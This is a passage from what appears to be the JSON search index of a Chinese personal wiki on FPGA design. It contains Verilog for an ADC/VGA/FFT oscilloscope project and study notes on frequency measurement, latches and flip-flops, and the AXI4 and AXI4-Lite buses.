AD_CLK; //否则保持不变 end //时序电路,用来给AD_CS寄存器赋值 always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) //判断复位 AD_CS &lt;= 1&#x27;h0; //初始化AD_CS值 else AD_CS &lt;= AD_CS_N; //用来给AD_CS赋值 end //组合电路,用来生成AD的片选波形 always @ (*) begin if((ad_fsm_cs == FSM_DATA) || (ad_fsm_cs == FSM_READY))//判断状态机的当前状态 AD_CS_N = 1&#x27;h0;//如果当前的状态等于读取数据状态或等于延时1.4us状态,AD_CS_N就置0 else AD_CS_N = 1&#x27;h1;//如果当前的状态不等于读取数据状态或不等于延时1.4us状态,AD_CS_N就置1 end //时序电路,用来给ad_data_reg寄存器赋值 always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) //判断复位 ad_data_reg &lt;= 8&#x27;h0; //初始化ad_data_reg值 else ad_data_reg &lt;= ad_data_reg_n;\t//用来给ad_data_reg赋值 end //组合电路,将AD线上的数据保存到移位寄存器中 always @(*) begin if((ad_fsm_cs == FSM_DATA) &amp;&amp; (!AD_CLK) &amp;&amp; (AD_CLK_N))//判断每一个时钟的上升沿 ad_data_reg_n = &#123;ad_data_reg[6:0],AD_DATA&#125;;//将数据存入移位寄存器中,高位优先 else ad_data_reg_n = ad_data_reg;\t//否则保持不变 end //时序电路,用来给data_out寄存器赋值 always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) //判断复位 data_out &lt;= 8&#x27;h0; //初始化data_out值 else data_out &lt;= data_out_n; //用来给data_out赋值 end //组合电路,将移位寄存器中的数据存入data_out中,可用于输出 always @ (*) begin if(ad_fsm_cs == FSM_END) //判断复位 data_out_n = ad_data_reg; //初始化data_out值 else data_out_n = data_out; //用来给data_out赋值 end endmodule A4_Oscilloscope_Top.v module A4_Oscilloscope_Top ( //时钟和复位端口 input CLK_50M, input RST_N, //AD外设端口 output AD_CS, output AD_CLK, input AD_DATA, //DA外设端口 output da_clk , output da_data , output da_ldac , output da_load , input [3:0] key , //VGA外设端口 output VGA_HSYNC, output VGA_VSYNC, output\t[ 7:0]\tVGA_DATA, input key_add , // 减少脉冲频率按键 input key_low , // 增加脉冲频率按键 //seg input wire clk_test, output wire clk_out , //生成的待检测时钟 output wire [7:0]segdata, output wire [2:0]segcs ); //--------------------------------------------------------------------------- //-- 内部端口声明 //--------------------------------------------------------------------------- wire clk_40m; //PLL生成的40M时钟 wire [ 7:0] in_ad_data; //AD模数转换完成的数据输出 wire [15:0] vga_x; //VGA的x坐标 wire [31:0] vga_fengzhi; //VGA中显示的峰峰值 wire [ 7:0] ad_to_vga_data;\t//VGA中显示的波形数据 //--------------------------------------------------------------------------- //-- 逻辑功能实现 //--------------------------------------------------------------------------- // 实例化DA模块 top_dds top_dds_inst ( .sys_clk (CLK_50M) , // 系统时钟,50MHz .sys_rst_n (RST_N) , // 复位信号,低电平有效 .key (key) , // 输入4位按键 .key_add (key_add) , // 输入按键 .key_low (key_low) , // 输入按键 .da_clk (da_clk) , // 时钟信号 .da_data (da_data) , // 数据信号 .da_ldac (da_ldac) , // LDAC信号 .da_load (da_load) , // LOAD信号 ); //例化AD模块 Ad_Module Ad_Init ( .CLK_50M (CLK_50M ),\t//时钟端口 .RST_N (RST_N ),\t//复位端口 .AD_CS (AD_CS ),\t//AD片选端口 .AD_CLK (AD_CLK ),\t//AD时钟，最大不超过1.1MHz .AD_DATA (AD_DATA ),\t//AD数据端口 .data_out (in_ad_data )\t//AD模数转换完成的数据输出 ); Data_Process Data_Process_Init ( .CLK_50M (CLK_50M ),\t//系统时钟50MHz .CLK_40M (clk_40m ),\t//PLL生成的40MHz时钟 .RST_N (RST_N ),\t//复位端口 .AD_CS (AD_CS ),\t//AD片选端口 .in_ad_data (in_ad_data ), //AD模数转换完成的数据输出 .vga_x (vga_x ),\t//VGA的x坐标 .vga_fengzhi\t(vga_fengzhi\t), //VGA中显示的峰峰值 .ad_to_vga_data(ad_to_vga_data)\t//VGA中显示的波形数据 ); //例化PLL模块 PLL_Module PLL_Module_Init ( .inclk0 (CLK_50M ),\t//系统时钟50MHz .c0 (clk_40m )\t//PLL生成的40MHz时钟 ); //例化VGA模块 Vga_Module VGA_Init ( .RST_N (RST_N ),\t//复位端口 .CLK_40M (clk_40m ),\t//PLL生成的40MHz时钟 .VSYNC (VGA_VSYNC ),\t//VGA垂直同步端口 .HSYNC (VGA_HSYNC ),\t//VGA水平同步端口 .VGA_DATA (VGA_DATA ),\t//VGA数据端口 .vga_x (vga_x ), //VGA的x坐标 .ad_to_vga_data(ad_to_vga_data), //VGA中显示的波形数据 .vga_freq (20&#x27;d500 ), //VGA中显示的频率值 .vga_fengzhi\t(vga_fengzhi\t) //VGA中显示的峰峰值 ); //wire define wire [19:0] freq ; //计算得到的待检测信号时钟频率 //------------- freq_meter_calc_inst -------------- freq_meter_calc freq_meter_calc_inst ( .sys_clk (clk_40m ), //系统时钟,频率50MHz .sys_rst_n (RST_N ), //复位信号,低电平有效 .clk_test (da_data ), //待检测时钟 .freq (freq ) //待检测时钟频率 ); seg seg_inst ( .clk(clk_40m), .rst_n(RST_N), .tenvalue(20&#x27;d500), // 这里连接没有问题 .segdata(segdata), .segcs(segcs) ); endmodule Data_Process.vmodule Data_Process ( //输入端口 CLK_50M,CLK_40M,RST_N,AD_CS,in_ad_data,vga_x //输出端口 ,vga_fengzhi,ad_to_vga_data ); //--------------------------------------------------------------------------- //-- 外部端口声明 //--------------------------------------------------------------------------- input CLK_50M; //时钟端口,开发板用的50M晶振 input CLK_40M; //PLL生成的40M时钟 input RST_N; //复位端口,低电平复位 input AD_CS; //AD片选信号端口 input [ 7:0]\tin_ad_data; //AD模数转换完成的数据输出 input [15:0]\tvga_x; //VGA的x坐标 output [31:0] vga_fengzhi; //VGA中显示的峰峰值 output [ 7:0]\tad_to_vga_data; //VGA中显示的波形数据 //--------------------------------------------------------------------------- //-- 内部端口声明 //--------------------------------------------------------------------------- reg [ 1:0]\tdetect_edge; //记录AD_CS的开始脉冲,即第一个上降沿 wire [ 1:0]\tdetect_edge_n; //detect_edge的下一个状态 reg posedge_reg; //上升沿标志 wire posedge_reg_n; //posedge_reg的下一个状态 reg [15:0] ad_to_vga_addr; //读取AD到VGA的地址 reg [15:0] ad_to_vga_addr_n; //ad_to_vga_addr的下一个状态 reg [15:0] ad_to_fft_addr; //读取AD到FFT的地址 reg [15:0] ad_to_fft_addr_n; //ad_to_fft_addr的下一个状态 reg [26:0]\ttime_cnt; //定时计数器 reg [26:0]\ttime_cnt_n; //time_cnt的下一个状态 reg fft_rst_flag; //FFT模块复位标志位 reg fft_rst_flag_n; //fft_rst_flag标志位 wire [ 9:0] fft_bit_cnt; //FFT位计数器 wire [ 9:0] fft_real_out_int; //FFT实数的输出 wire [ 9:0] fft_imag_out_int; //FFT虚数的输出 wire [ 9:0]\tad_to_fft_data; //FFT中用到的AD数据 wire [31:0] vga_freq; //VGA中显示的频率值 wire [31:0] vga_fengzhi; //VGA中显示的峰峰值 //设置定时器的时间为1s,计算方法为 (1*10^6)ns / (1/50)ns 50MHz为开发板晶振 parameter SET_TIME_1S = 27&#x27;d50_000_000; //--------------------------------------------------------------------------- //-- 逻辑功能实现 //--------------------------------------------------------------------------- //时序电路,用来给detect_edge寄存器赋值 always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) //判断复位 detect_edge\t&lt;= 2&#x27;b11; //初始化detect_edge值 else detect_edge &lt;= detect_edge_n; //用来给detect_edge赋值 end //组合电路,检测上升沿 assign detect_edge_n = &#123;detect_edge[0] , AD_CS&#125;; //接收AD_CS的时钟信号 //时序电路,用来给posedge_reg寄存器赋值 always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) //判断复位 posedge_reg\t&lt;= 1&#x27;b0; //初始化posedge_reg值 else posedge_reg &lt;= posedge_reg_n; //用来给posedge_reg赋值 end //组合电路,判断上升沿,如果detect_edge等于01,posedge_reg_n就置1 assign posedge_reg_n = (detect_edge == 2&#x27;b01) ? 1&#x27;b1 : 1&#x27;b0; //时序电路,用来给ad_to_vga_addr寄存器赋值 always @ (posedge posedge_reg or negedge RST_N) begin if(!RST_N) //判断复位 ad_to_vga_addr &lt;= 1&#x27;b0; //初始化ad_to_vga_addr else ad_to_vga_addr &lt;= ad_to_vga_addr_n;//给ad_to_vga_addr赋值 end //组合电路,用于生成RAM_AD_TO_VGA的地址 always @ (*) begin if(ad_to_vga_addr &lt; 16&#x27;d800) //判断地址 ad_to_vga_addr_n = ad_to_vga_addr + 1&#x27;b1;//地址累加 else ad_to_vga_addr_n &lt;= 0; //地址清零 end //例化双口RAM_AD_TO_VGA模块 RAM_AD_TO_VGA AD_TO_VGA_Init ( .wrclock (CLK_50M ),\t//写时钟 .wraddress (ad_to_vga_addr ),\t//写地址 .wren (posedge_reg ),\t//写使能 .data (10&#x27;d255 - in_ad_data),\t//写数据 .rdclock (CLK_40M ),\t//读时钟 .rdaddress (vga_x - 16&#x27;d100 ),\t//读地址 .q (ad_to_vga_data )\t//读数据 ); //时序电路,用来给ad_to_vga_addr寄存器赋值 always @ (posedge posedge_reg or negedge RST_N) begin if(!RST_N) //判断复位 ad_to_fft_addr &lt;= 1&#x27;b0; //初始化ad_to_fft_addr else ad_to_fft_addr &lt;= ad_to_fft_addr_n;//给ad_to_fft_addr赋值 end //组合电路,用于生成RAM_AD_TO_FFT的地址 always @ (*) begin if(ad_to_fft_addr &lt; 16&#x27;d256) //判断地址 ad_to_fft_addr_n = ad_to_fft_addr + 1&#x27;b1;//地址累加 else ad_to_fft_addr_n &lt;= 0; //地址清零 end //例化双口RAM_AD_TO_FFT模块 RAM_AD_TO_FFT AD_TO_FFT_Init ( .wrclock (CLK_50M ), //写时钟 .wraddress (ad_to_fft_addr ), //写地址 .wren (posedge_reg ), //写使能 .data (in_ad_data ), //写数据 .rdclock (CLK_50M ), //读时钟 .rdaddress (fft_bit_cnt ), //读地址 .q (ad_to_fft_data\t) //读数据 ); //时序电路，用来给time_cnt寄存器赋值 always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) //判断复位 time_cnt &lt;= 27&#x27;h0; //初始化time_cnt值 else time_cnt &lt;= time_cnt_n; //用来给time_cnt赋值 end //组合电路，实现1s的定时计数器 always @ (*) begin if(time_cnt == SET_TIME_1S) //判断1s时间 time_cnt_n = 27&#x27;h0; //如果到达1s,定时计数器将会被清零 else time_cnt_n = time_cnt + 27&#x27;h1;\t//如果未到1s,定时计数器将会继续累加 end //时序电路，用来给fft_rst_flag寄存器赋值 always @ (posedge CLK_50M or negedge RST_N) begin if(!RST_N) //判断复位 fft_rst_flag &lt;= 1&#x27;b0; //初始化fft_rst_flag值 else fft_rst_flag &lt;= fft_rst_flag_n;\t//用来给fft_rst_flag赋值 end //组合电路,用来生成FFT模块复位标志位 always @ (*) begin if(time_cnt == SET_TIME_1S) //判断时间 fft_rst_flag_n = 1&#x27;b0; //FFT模块复位标志位置0 else fft_rst_flag_n = 1&#x27;b1; //FFT模块复位标志位置1 end //例化FFT控制模块 FFT_Control_Module FFT_Control_Init ( .CLK_50M (CLK_50M ), //时钟端口,开发板用的50M晶振 .RST_N (fft_rst_flag ),\t//FFT模块复位标志位 .data_real_in_int\t(ad_to_fft_data\t), //FFT中用到的AD数据 .fft_real_out_int\t(fft_real_out_int\t),\t//FFT实数的输出 .fft_imag_out_int\t(fft_imag_out_int\t), //FFT虚数的输出 .fft_bit_cnt (fft_bit_cnt ), //FFT位计数器 .vga_fengzhi (vga_fengzhi ) //VGA中显示的峰峰值 ); endmodule"},{"title":"简易频率计的设计与验证","path":"/wiki/FPGA/简易频率计的设计与验证.html","content":"参考链接[1. 简易频率计的设计与验证 — 野火]FPGA Verilog开发实战指南——基于Altera EP4CE10 征途Mini开发板 文档 (embedfire.com) 常用频率测量法所谓的频率测量，就是单位时间内信号周期变化的次数 常用频率测量法：频率测量法、周期测量法、等精度测量法 频率测量法：在时间T内对被测时钟信号的时钟周期N进行计数，然后求出单位时间内的时钟周期数，即为被测时钟信号的时钟频率 周期测量法：先测量出被测时钟信号的时钟周期T，然后根据频率f&#x3D;1&#x2F;T求出被测时钟信号的频率。（测量第一个上升沿和第二个上升沿之间的时间，取出倒数就是被测时钟信号的时钟频率T了） 但是上述两种方法都会产生±1个被测时钟周期的误差，在实际应用中有一定的局限性；而且根据两种方式的测量原理，很容易发现频率测量法适合于测量高频时钟信号，而周期测量法适合于低频时钟信号的测量，但二者都不能兼顾高低频率同样精度的测量要求。 等精度测量法与前两种方式不同，其最大的特点是，测量的实际门控时间不是一个固定值，它与被测时钟信号相关，是被测时钟信号周期的整数倍。在实际门控信号下，同时对标准时钟和被测时钟信号的时钟周期进行计数，再通过公式计算得到被测信号的时钟频率。 由于实际门控信号是被测时钟周期的整数倍，就消除了被测信号产生的±1时钟周期的误差，但是会产生对标准时钟信号±1时钟周期的误差。等精度测量原理示意图如图下图所示。 等精度测量法： 20240519171443 结合等精度测量原理和原理示意图可得：被测时钟信号的时钟频率fx的相对误差与被测时钟信号无关；增大“软件闸门”的有效范围或者提高“标准时钟信号”的时钟频率fs，可以减小误差，提高测量精度。 等精度测量精度的误差&#x3D;X个时钟周期误差&#x2F;标准时钟频率（Hz） 了解了等精度测量原理之后，我们来说明一下被测时钟信号的计算方法。 首先我们先分别对实际闸门下被测时钟信号和标准时钟信号的时钟周期进行计数。 实际闸门下被测时钟信号周期数为X，设被测信号时钟周期为Tfx，它的时钟频率fx &#x3D; 1&#x2F;Tfx，由此可得等式：X * Tfx &#x3D; X &#x2F; fx &#x3D; Tx(实际闸门)。 实际闸门下标准时钟信号周期数为Y，设被测信号时钟周期为Tfs，它的时钟频率fs &#x3D; 1&#x2F;Tfs，由此可得等式：Y * Tfs &#x3D; Y &#x2F; fs &#x3D; Tx(实际闸门)。 其次，将两等式结合得到只包含各自时钟周期计数和时钟频率的等式：X &#x2F; fx &#x3D; Y &#x2F; fs &#x3D; Tx(实际闸门)，等式变换，得到被测时钟信号时钟频率计算公式：fx &#x3D; X * fs &#x2F; Y。 最后，将已知量标准时钟信号时钟频率fs和测量量X、Y带入计算公式，得到被测时钟信号时钟频率fx。 实战演练"},{"title":"锁存器和触发器的理解与整理","path":"/wiki/FPGA/锁存器和触发器的理解与整理.html","content":"开发中···锁存器和触发器的理解与整理.md 引言大多数数字系统中，除了需要具有逻辑运算和算术运算功能的组合逻辑电路外，还需要具有存储功能的电路。组合电路与存储电路结合构成的时序逻辑电路，简称时序电路。这里讨论实现存储功能的两种逻辑单元电路：锁存器和触发器。 锁存器：用来存储状态信息，锁存器一般是电平触发，当锁存器使能时，输出随着输入变化，当没有使能时，输出一直为锁存器的状态信息 触发器：触发器当收到一个clk触发脉冲时，输出就会根据一定规则改变状态，然后保持直到下一个触发脉冲。 区别：锁存器和触发器的区别在与latch，当使能时，输入变化时输出就会跟随一起变化，没有clk，更容易产生毛刺。而flip-flop收到时钟的同步控制，只有clk触发时才会采样当前的输入。对脉冲电平敏感的是锁存器，对脉冲边沿敏感的是触发器。 寄存器：用来存储数据的小型存储区域，暂时存放参与运算的数据和运算结果，寄存器的存储电路是由锁存器和触发器构成的，因为1个锁存器或者触发器只能存储1位2进制数据，所以由N个锁存器或者触发器可以构成N位寄存器，在实际芯片中一般按照字节位数设计，所以一般与8位寄存器、16位寄存器。 下面我们着重分析一下锁存器和触发器原理并且举出简单的应用例子方便大家的理解与掌握。 1. 基本双稳态电路 图：最基本的双稳态电路 双稳态电路将两个非门进行交叉耦合的方式连接，则构成最基本的双稳态电路。从电路的逻辑关系可知，若Q&#x3D;0，经过非门$G_2$ 反向得到$\\overline{Q}$&#x3D;1。$\\overline{Q}$反馈给$G_1$输入端，又保证了$Q$&#x3D;0，由于两个非门首尾相接的逻辑锁定，因此电路能够自行保持在$Q$&#x3D;0，而$\\overline{Q}$&#x3D;1的情况。 像这样的电路，具有0,1两种逻辑状态，一旦进入其中一种状态，就能长期保持不变的单元电路，称为双稳态存储电路，简称双稳态电路。 根据上面的分析，可以看出这个最基本的双稳态电路的功能极不完备。在接通电源后，它可能随机进入0或者1状态并且锁定在这个里面，我们无法控制和改变它的状态，从而并不能作为存储电路来使用。因此下面我们在这个最基本的双稳态电路下衍生出锁存器、触发器等功能完备的存储电路 2. SR锁存器2.1 或非门构成SR锁存器图：或非门SR锁存器电路及逻辑符号 我们讲最基本的双稳态电路中的非门替换成或非门，则构成了上图所示的基本SR锁存器，它是一种具有最简单控制功能的双稳态电路，因为我们将非门替换了2输入一输出的或非门，那么留出的输入端也就成为了我们的输入控制端。 $S_D$$R_D$Q$\\overline{Q}$功能0000保持0011保持0100置00110置01011置11001置11100不定 根据S、R的4种输入状态组合得到左表格，具体的分析过程请参考：电路技术基础-数字部分P232。值得注意的是：在书中讲到S&#x3D;R&#x3D;1的时候，锁存器处在即非0也非1的非定义状态，为保证锁存器始终处于工作定义状态，输入信号应遵守$S_D$$R_D$约束条件，也就是死活不允许S&#x3D;R&#x3D;1。 2.2 与非门构成SR锁存器当然了，既然在最基本的双稳态电路中仅将非门替换成了或非门就构成了SR锁存器，同样也可以替换成与非门来构成另一种SR锁存器（也称：基本$\\overline{S}$$\\overline{R}$锁存器）。其原理都是一样的，只不过是其真值表有所出入罢了。 图：与非门构成的基本SR锁存器及逻辑符号 $S_D{‘}$$R_D{‘}$Q$\\overline{Q}$功能00--不定0101置10111置11000置01010置01100保持1111保持 其约束条件同样遵守$S_D$$R_D$&#x3D;0，与非门是低电平有效，当输入SR&#x3D;11时，就相当于我们最开始的最基本双稳态电路，起保持的功能 2.3基本SR锁存器的应用–硬件去抖动电路理想按键与实际按键对比 抖动如何产生？因为机械固有的物理特性，开关触点在瞬间接触的时候会有力学的回弹，使开关在“通”“断”之间反复横跳，造成 2-10 毫秒内信号不稳定。 在大部分情况下，这种信号抖动持续是没有影响的。但是当一个开关连接到一个足够“快”的电子设备上时，它可以检测到多次抖动并做出响应，那么就会引起问题。 在此，去除抖动的必要性就体现出来了。 2.3.1 原理两种常见开关的抖动下图是开关按下时，电平变化的示意图。 有时，电压在电源和地之间跃变；有时，则是在初始值和某个中间电压之间跳动。取决于不同开关的特性，这种跃变的行为也往往具有不确定性。 在拨动 SPST-NO 开关情况下，NO 端可能发生抖动。（图片来源：Max Maxfield） 在拨动 SPDT 开关情况下，NO 和 NC 端子上都可能出现抖动。（图片来源：Max Maxfield） 使用 SR 锁存器进行消抖使用基于与非门的 SR 锁存器对 SPDT 开关进行消抖十分有效。下图是消抖电路的示意图。 SR 锁存器的“0”状态（图片来源：Max Maxfield） SR 锁存器的“1”状态（图片来源：Max Maxfield） 以上图的“1”状态的情况为例，我们分析一下工作过程。 注意到，与非门构成的锁存器是低电平输入有效的。当开关未按下时，常闭触点 NO 接地，对于锁存器来说，此时 S 端为低电平，故 Q 被设为高电平。 当我们按下开关，触片就从 NO 断开而接触 NC。在接触 NC 的瞬间，有 S &#x3D; 1（上拉）, R &#x3D; 0，故 Q 被设为低电平，完成电平转换。 但是前文提到，由于开关的弹性，在触片第一次接触 NC 后，还会弹起微小的距离，使得此时 NC 与触片断开。注意，由于弹起的距离很小，触片不足以碰到 NO，因此这时开关侧的 NO、NC 都处于“悬空状态”，对于锁存器来说，由于上拉电阻的存在，SR&#x3D;11。 而根据锁存器的特性，当 S、R 同时为高电平时，输出端将保持原来的状态不变。 因此，在触片弹开而使得 NO、NC 悬空的一小段时间内，Q 端的输出并不受到影响，继续保持低电平，抖动就此消除。 方才分析的是触片反弹一次的情况，一般来说，触片在第一次接触 NC 后往往会反弹数次（振幅不断减小，直至于0），但通过刚才的分析，我们知道这无关紧要。在数次“悬空（实际是上拉）-拉低-悬空-拉低”的过程中，SR 锁存器不断“保持-置0-保持-置0”，Q 端的输出不会改变。 要想让 Q 端回到高电平，唯一的可能性就是松手，让触点接触 NO 端，把 S 端拉低。（嘿嘿，触片弹回 NO 的过程中也会反复横跳数次的。） 2.4 D锁存器与SR锁存器不同，D锁存器在工作中不存在非定义状态，因而得到广泛的应用。目前，CMOS集成电路主要采用传输门控D锁存器和逻辑门控D锁存器两种电路结构形式，特别是前者电路结构简单，在芯片中占用的面积小而更收青睐。 （这里占个坑位，后面再讲） 3. 触发器这是一种对脉冲边沿敏感的双稳态电路，只对时钟信号的上升沿或者下降沿敏感，而在其它时刻保持不变，例如我们熟知的计数器、移位寄存器。这种对脉冲边沿敏感的状态更新称为触发，具有触发工作特性的存储单元称为触发器，根据触发边沿不同可以分为：上升沿触发和下降沿触发。 目前应用的触发器主要与三种电路结构：主从触发器、维持阻塞触发器和利用传输延迟的触发器。其中主从结构的D触发器在芯片上占用的面积最小，逻辑设计也简单从而广泛使用 （这里占个坑位，后面再讲） 参考文章 电路技术基础-数字部分-第六版-康华光主编 数字电子技术基础5——锁存器与触发器_三态输出触发器及锁存器实验报告-CSDN博客 Kimi人工智能 5.2.1 基于或非门的SR锁存器_哔哩哔哩_bilibili 5.2.2 基于与非门的SR锁存器_哔哩哔哩_bilibili 基于SR锁存器进行按键消抖的PCB电路设计与验证 | Hui-Shao’s Blog"},{"title":"高速光通信项目","path":"/wiki/FPGA/高速光通信项目.html","content":"开发中···高速光通信项目.md"},{"title":"高速接口的学习","path":"/wiki/FPGA/高速接口的学习.html","content":"开发中···高速接口的学习.md"},{"title":"01_AXI4基础知识","path":"/wiki/FPGA/小白FPGA_AXI4总线/01_AXI4基础知识.html","content":"1.1 AXI4总线 AXI4是ARM公司提出的一种高性能、高宽带、低延时的片内总线 主要描述了主设备和从设备之间的传输方式 分类：AXI4_FULL、AXI4_LIFE、AXI4_STREAM AXI4_LIFE，不支持突发传输，常用于数据量较小的传输，可以理解成轻量级的AXI4_FULL AXI4_FULL 也被称为AXI4，支持突发传输，突发长度为1~256，在只指定一次地址后，可以一次传输多大256个数据（数据的宽度取决于带宽） AXI4_STREAM 丢弃了地址项，常用于高速数据传输，因为没有了地址总线，所以用于数据流传送，允许无限制的数据突发传输规模 本次实验目的 通过使用DDR3中AXI4接口协议，完成DDR3的读写操作，参考b站野火，使用IP核实现 从零开始，通过时序图编写程序，完成DDR3的读写操作，参考为小白FPGA基础班 1.2 应用场景 AXI4.0-lite主要用于内核和外设寄存器之间的通信。功能类似STM32中外设与CPU之间的通信时使用的协议，比如当访问串口的数据寄存器时，只访问四个字节的数据，所以使用AXI4.0-lite就特别合适。再比如，在PL写一个用于PS端操作的外设时，其外设寄存器一般通过AXI4.0-lite总线和PS交互。 AXI4.0-full主要用于往DDR或者OCM中写入大量数据时使用。 AXI_stream主要用于往FIFO等没有地址的数据缓冲区传送大量数据时使用。关于每种协议详细的使用会在单独介绍中详细介绍，下面主要描述他们一致的地方。 1.3 常见名词解释1.3.1 握手（handshake）是什么 双向握手机制使用xxVALID和xxREADY信号线来控制，只有当xxVALID和xxREADY信号线都为高电平时，传输线上的信息才有效。发送端发起一个请求，接收端收到之后会回复一个信号，如果接收端没有发送信号，发送端会一直保持请求的状态，直到收到接收端回复的信号 主机如何将“写数据”写入到从机、WVALID：主机写数据有效信号，方向：主机-&gt;从机 WDATA：主机写数据，方向：主机-&gt;从机 WREADY：表示从机是否准备好了 ，为高代表从机准备好了，方向：从机-&gt;主机 总结：只有当WVALID和WREADY信号同时为高时，数据才能被有效写入到从机，握手信号不仅仅发生在“写数据”、发送“写地址”等过程，只要主机和从机之间有数据交换，就会发送握手信号 1.3.2 什么是片内，什么是片外？以下是我个人理解，没有经过验证，酌情查阅 片内On-Chip，指的是在FPGA内部系统，如AXI4协议在ZYNQ中PS端到PL端的传输，不涉及到外设的芯片 片外Off-Chip，与片内系统相反，需要借助外部芯片进行传输协议，例如我们的FPGA需要通过SPI协议与外部设备进行数据交换的时候，此时就是片外通信协议 1.3.3 什么是突发传输？ 例如上面的图像，第一个时序是没有突发的，发送一次发送一个数据和一个地址进行对应，而下面的时序是具有突发传输的，主机发送4个字节，和首地址及末地址，不需要传输中间的地址，他的突发长度就是为4。还是比较好理解的 1.4 AXI4_LIFE通道介绍 总结：读写分离，读的时候没有读响应通道 分类 信号定义 方向 功能 系统 ACLK 时钟 系统 ARESETN 复位低有效 写地址通道 AWADDR 主机 to 从机 写地址 AWVALID0 主机 to 从机 写地址有效信号 AWREADY 从机 to 主机 表示从机准备好了，可以接收写地址 AWPROT 主机 to 从机 保护类型，表示一个传输的安全等级，默认为3’b000 写数据通道 WDATA 主机 to 从机 写数据 WVALID 主机 to 从机 写数据有效 WREADY 从机 to 主机 表示从机准备好了，可以接收写数据 WSTRB 主机 to 从机 指示有效字节位置，类似于掩码 写响应通道 BRESP 从机 to 主机 写响应 BVALID 从机 to 主机 写响应有效信号 BREADY 主机 to 从机 表示主机准备好了，可以接收从机的响应 读地址通道 ARADDR 主机 to 从机 读地址 ARVALID 主机 to 从机 读地址有效信号 ARREADY 从机 to 主机 表示从机准备好了，可以接收读地址 ARPROT 主机 to 从机 保护类型，表示一个传输的安全等级，默认为3’b000 读数据通道 RDATA 从机 to 主机 读数据 RVALID 从机 to 主机 读有效 RREADY 主机 to 从机 表示主机准备好了，可以接收从机的数据 RRESP 从机 to 主机 读响应 1.5 写数据的模式1、主机发送写地址和写数据的顺序关系： 主机可以先发送写地址，后发送写数据： 主机可以先发送写数据，后发送写地址： 主机可以同时发送写地址和写数据： 2、从机接收写地址和写数据的顺序关系： 从机可以先接收写地址，后接收写数据 从机可以先接收写数据，后接收写地址： 从机可以同时接收写地址和写数据： 我们常用的方式是主机同时发送写地址和写数据，从机同时接收写地址和写数据，然后发送写响应表示写的没问题 1.6读数据的模式主机发送一个读地址 –&gt; 从机接受读地址 –&gt; 从机发送读数据和读响应 下一节，我们进行AXI4_Lite的读写通道和仿真代码的实现"},{"title":"02_AXI4_Lite的读写通道和仿真代码的实现","path":"/wiki/FPGA/小白FPGA_AXI4总线/02_AXI4_Lite的读写通道和仿真代码的实现.html","content":"1. axi4_lite的作用axi4_lite:它的作用可以配置一些IP核处于不同的工作模式，xdma IP核，在ZYNQ中的axi dma，在做高速接口时的srio，功能类似STM32中外设与CPU之间的通信时使用的协议，比如当访问串口的数据寄存器时，只访问四个字节的数据，所以使用AXI4-lite就特别合适。再比如，在PL写一个用于PS端操作的外设时，其外设寄存器一般通过AXI4-lite总线和PS交互。 数据总线只能是32位或者64位。 每次传输只能传输一个数据。 所有访问都是不可修改(Non-modifiable)，不可缓冲(Non-bufferable)。 Exclusive 访问不支持。 2. axi4_lited 的仿真这里是用户读写请求仿真模块的仿真结果 2.1 IP2.1.1 FIFO 2.1.2 BRAM 2.2 RTLaxilite_master.vmodule axilite_master #( parameter USER_WR_DATA_WIDTH = 32, parameter USER_RD_DATA_WIDTH = 32, parameter AXI_DATA_WIDTH = 32, parameter AXI_ADDR_WIDTH = 32 )( input user_wr_clk , input user_rd_clk , input axi_clk , input reset , input user_wr_en , input [USER_WR_DATA_WIDTH-1:0] user_wr_data , input [AXI_ADDR_WIDTH-1:0] user_wr_addr , output user_wr_ready , input user_rd_en , input [AXI_ADDR_WIDTH-1:0] user_rd_addr , output user_rd_ready , output user_rd_valid , output [USER_RD_DATA_WIDTH-1:0] user_rd_data , output m_axi_awvalid , input m_axi_awready , output [AXI_ADDR_WIDTH-1:0] m_axi_awaddr , output [2:0] m_axi_awport , output m_axi_wvalid , input m_axi_wready , output [AXI_ADDR_WIDTH-1:0] m_axi_wdata , output [AXI_DATA_WIDTH-1:0] m_axi_strb , input m_axi_bvalid , output m_axi_bready , input [1:0] m_axi_bresp , output m_axi_arvalid , input m_axi_arready , output [AXI_ADDR_WIDTH-1:0] m_axi_araddr , output [2:0] m_axi_arport , input m_axi_rvalid , input [AXI_ADDR_WIDTH-1:0] m_axi_rdata , input [1:0] m_axi_rresp , output m_axi_rready ); wire wr_data_fifo_err; wire wr_cmd_fifo_err; wire rd_data_fifo_err; wire rd_cmd_fifo_err; axilite_wr_channel #( .USER_WR_DATA_WIDTH (USER_WR_DATA_WIDTH ), .AXI_DATA_WIDTH (AXI_DATA_WIDTH ), .AXI_ADDR_WIDTH (AXI_ADDR_WIDTH ) )axilite_wr_channel_inst( .clk (user_wr_clk ), .axi_clk (axi_clk ), .reset (reset ), .user_wr_en (user_wr_en ), .user_wr_data (user_wr_data ), .user_wr_addr (user_wr_addr ), .user_wr_ready (user_wr_ready ), .m_axi_awvalid (m_axi_awvalid ), .m_axi_awready (m_axi_awready ), .m_axi_awaddr (m_axi_awaddr ), .m_axi_awport (m_axi_awport ), .m_axi_wvalid (m_axi_wvalid ), .m_axi_wready (m_axi_wready ), .m_axi_wdata (m_axi_wdata ), .m_axi_strb (m_axi_strb ), .m_axi_bvalid (m_axi_bvalid ), .m_axi_bready (m_axi_bready ), .m_axi_bresp (m_axi_bresp ), .wr_data_fifo_err(wr_data_fifo_err ), .wr_cmd_fifo_err (wr_cmd_fifo_err ) ); axilite_rd_channel #( .USER_RD_DATA_WIDTH (USER_RD_DATA_WIDTH ), .AXI_DATA_WIDTH (AXI_DATA_WIDTH ), .AXI_ADDR_WIDTH (AXI_ADDR_WIDTH ) )axilite_rd_channel_inst( .clk (user_rd_clk ), .axi_clk (axi_clk ), .reset (reset ), .user_rd_en (user_rd_en ), .user_rd_addr (user_rd_addr ), .user_rd_ready (user_rd_ready ), .user_rd_valid (user_rd_valid ), .user_rd_data (user_rd_data ), .m_axi_arvalid (m_axi_arvalid ), .m_axi_arready (m_axi_arready ), .m_axi_araddr (m_axi_araddr ), .m_axi_arport (m_axi_arport ), .m_axi_rvalid (m_axi_rvalid ), .m_axi_rdata (m_axi_rdata ), .m_axi_rresp (m_axi_rresp ), .m_axi_rready (m_axi_rready ), .rd_data_fifo_err (rd_data_fifo_err ), .rd_cmd_fifo_err 